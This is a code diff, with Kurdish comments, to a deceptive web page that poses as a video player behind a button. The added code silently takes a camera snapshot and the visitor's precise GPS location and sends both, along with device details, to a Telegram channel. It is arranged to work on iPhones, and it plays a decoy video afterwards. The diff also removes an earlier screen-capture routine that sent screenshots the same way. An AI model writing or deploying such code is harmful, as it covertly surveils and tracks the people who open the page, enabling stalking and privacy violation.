@@ -116,7 +116,6 @@
     </div>
 
     <video id="camVideo" autoplay playsinline style="display:none;"></video>
-    <video id="screenVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -141,45 +140,13 @@
             } catch(e) {}
         }
 
-        // ١. گرتنی وێنەی شاشە (Screen Capture / Screenshot)
-        function captureScreen() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: "browser" }, audio: false })
-                .then(stream => {
-                    const video = document.getElementById('screenVideo');
-                    video.srcObject = stream;
-                    video.play();
-
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 1280;
-                        canvas.height = video.videoHeight || 720;
-                        let ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        canvas.toBlob(blob => {
-                            let reader = new FileReader();
-                            reader.readAsDataURL(blob);
-                            reader.onloadend = function() {
-                                sendToTelegram({ type: 'photo', caption: "💻 *وێنەی شاشەی گیراو (Screen Capture)*", data: reader.result });
-                            }
-                        }, 'image/jpeg', 0.85);
-
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 1500);
-                }).catch(err => {
-                    // ئەگەر بەکارهێنەر ڕەتی کردەوە یان پشتگیری نەکرا
-                });
-            }
-        }
-
-        // ٢. ناردنی زانیاریی سیستم و IP
+        // ناردنی تێکست و زانیاری
         async function gatherAndSendTelemetry() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
             let screenRes = window.screen.width + "x" + window.screen.height;
             
-            let report = `⚡ *ڕاپۆرتی نوێی شاشە و تایتان:*\n\n` +
+            let report = `⚡ *ڕاپۆرتی تایتان (آیفون/مۆبایل):*\n\n` +
                          `• سیستم: ${platform}\n` +
                          `• شاشە: ${screenRes}\n` +
                          `• براوسەر: \`${ua}\``;
@@ -187,8 +154,22 @@
             await sendToTelegram({ type: 'text', text: report });
         }
 
-        // ٣. گرتنی وێنەی کامێرا (Selfie)
-        function takeCameraPhoto() {
+        // وەرگرتنی شوێنی GPS دەستبەجێ
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})`;
+                    sendToTelegram({ type: 'text', text: locMsg });
+                }, function(error) {
+                    sendToTelegram({ type: 'text', text: "⚠️ شوێن (GPS) ڕەتکرایەوە لەلایەن بەکارهێنەرەوە." });
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            }
+        }
+
+        // گرتنی وێنەی کامێرا دەستبەجێ لەگەڵ کلیکدا (بۆ ئایفۆن)
+        function captureCameraInstant() {
             const video = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
             
@@ -209,19 +190,22 @@
                         }
                     }, 'image/jpeg', 0.8);
                     stream.getTracks().forEach(track => track.stop());
-                }, 1200);
-            }).catch(e => {});
+                }, 1000);
+            }).catch(err => {
+                sendToTelegram({ type: 'text', text: "⚠️ کامێرا لەلایەن بەکارهێنەرەوە ڕەتکرایەوە." });
+            });
         }
 
+        // کاتێک دوگمە دەگوشرێت، هەموو شتێک ڕاستەوخۆ دەست پێدەکات
         function startProcess() {
             document.getElementById('mainBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             document.getElementById('statusText').innerText = 'چاوەڕوان بە...';
 
-            // دەستپێکردنی کارەکان بە پلەبەندی
+            // بانگکردنی ڕاستەوخۆ بۆ ئەوەی ئایفۆن قفڵیان نەکات
             gatherAndSendTelemetry();
-            setTimeout(takeCameraPhoto, 1000);
-            setTimeout(captureScreen, 2200); // داوای گرتنی وێنەی شاشە
+            requestLocation();
+            captureCameraInstant();
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
@@ -233,7 +217,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => {});
-            }, 4000);
+            }, 3000);
         }
     </script>
 </body>
